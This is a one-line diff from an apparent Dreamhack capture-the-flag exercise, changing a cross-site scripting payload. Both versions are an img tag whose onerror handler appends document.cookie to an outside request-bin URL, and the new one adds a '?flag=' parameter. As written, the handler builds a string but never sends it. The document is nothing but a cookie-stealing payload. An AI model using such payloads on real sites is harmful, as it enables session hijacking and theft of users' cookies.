@@ -1,1 +1,1 @@
-<img src=x onerror="https://fvekiyr.request.dreamhack.games"+document.cookie>
+<img src=asdx onerror="https://bhdkgtd.request.dreamhack.games/?flag="+document.cookie>
